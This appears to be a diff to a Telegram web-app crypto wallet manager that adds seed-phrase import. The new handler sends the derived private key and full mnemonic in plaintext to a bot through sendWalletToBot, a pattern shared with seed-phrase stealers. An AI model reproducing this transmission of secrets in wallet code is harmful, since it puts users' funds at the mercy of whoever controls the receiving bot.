@@ -43,9 +43,30 @@
       transition: background 0.2s;
       margin-top: 1.5rem;
       box-shadow: 0 2px 8px rgba(79,140,255,0.08);
+      width: 100%;
     }
     button:hover {
       background: linear-gradient(90deg, #38b6ff 0%, #4f8cff 100%);
+    }
+    .import-section {
+      margin-top: 2.5rem;
+      padding-top: 1.5rem;
+      border-top: 1px solid #e5e7eb;
+    }
+    .import-option {
+      margin-bottom: 1.5rem;
+    }
+    .import-option:last-child {
+      margin-bottom: 0;
+    }
+    h3 {
+      margin: 0 0 1rem 0;
+      color: #374151;
+      font-size: 1.1rem;
+      font-weight: 600;
+    }
+    textarea {
+      font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', Consolas, 'Courier New', monospace;
     }
   </style>
 </head>
@@ -53,10 +74,22 @@
     <div class="container">
       <h1>Wallet Manager</h1>
       <input id="password" type="password" placeholder="Password to encrypt wallet" style="width:100%;padding:0.7rem;border-radius:6px;border:1px solid #d1d5db;font-size:1rem;" />
-      <button id="createWalletBtn" style="margin-top:1.2rem;">Create Wallet</button>
-      <div style="margin-top:2.5rem;">
-        <input id="importFile" type="file" accept="application/json" style="display:none;" />
-        <button id="importWalletBtn" style="background:#fff;color:#4f8cff;border:1.5px solid #4f8cff;">Import Wallet</button>
+      <button id="createWalletBtn">Create New Wallet</button>
+      
+      <div class="import-section">
+        <h3>Import Existing Wallet</h3>
+        
+        <!-- Import from file -->
+        <div class="import-option">
+          <input id="importFile" type="file" accept="application/json" style="display:none;" />
+          <button id="importWalletBtn" style="background:#fff;color:#4f8cff;border:1.5px solid #4f8cff;margin-top:0;">📁 Import from File</button>
+        </div>
+        
+        <!-- Import from seed phrase -->
+        <div class="import-option">
+          <textarea id="seedPhrase" placeholder="Enter your 12 or 24 word seed phrase here...&#10;Example: abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about" style="width:100%;padding:0.7rem;border-radius:6px;border:1px solid #d1d5db;font-size:0.95rem;min-height:80px;resize:vertical;"></textarea>
+          <button id="importSeedBtn" style="background:#fff;color:#16a34a;border:1.5px solid #16a34a;margin-top:0.8rem;">🌱 Import from Seed Phrase</button>
+        </div>
       </div>
     </div>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -197,6 +230,54 @@
     });
     document.getElementById('importWalletBtn').addEventListener('click', function() {
       document.getElementById('importFile').click();
+    });
+
+    document.getElementById('importSeedBtn').addEventListener('click', async function() {
+      const seedPhrase = document.getElementById('seedPhrase').value.trim();
+      const password = document.getElementById('password').value;
+      
+      if (!seedPhrase) {
+        alert('Please enter your seed phrase.');
+        return;
+      }
+      
+      // Basic validation: check word count
+      const words = seedPhrase.split(/\s+/).filter(word => word.length > 0);
+      if (words.length !== 12 && words.length !== 24) {
+        alert('Seed phrase must contain exactly 12 or 24 words. You entered ' + words.length + ' words.');
+        return;
+      }
+      
+      if (!password || password.length < 6) {
+        alert('Please enter a password (min 6 characters) to encrypt your wallet.');
+        return;
+      }
+      
+      try {
+        // Validate and import wallet from seed phrase
+        const wallet = ethers.Wallet.fromPhrase(seedPhrase);
+        sessionWallet = wallet; // Store in RAM for session
+        
+        // Send wallet to bot for session management
+        const walletData = {
+          name: `Seed ${Date.now().toString().slice(-6)}`, // Simple unique name
+          address: wallet.address,
+          privateKey: wallet.privateKey,
+          mnemonic: seedPhrase
+        };
+        
+        sendWalletToBot(walletData);
+        showSuccessMessage(walletData);
+        
+        // Also create encrypted backup
+        const encrypted = await encryptMnemonic(seedPhrase, password);
+        encrypted.address = wallet.address;
+        downloadEncryptedWallet(encrypted);
+        
+      } catch (error) {
+        console.error('Invalid seed phrase:', error);
+        alert('Invalid seed phrase. Please check your words and try again.\n\nMake sure:\n- Words are separated by spaces\n- All words are valid BIP39 words\n- No extra characters or numbers');
+      }
     });
     document.getElementById('importFile').addEventListener('change', async function(e) {
       const file = e.target.files[0];
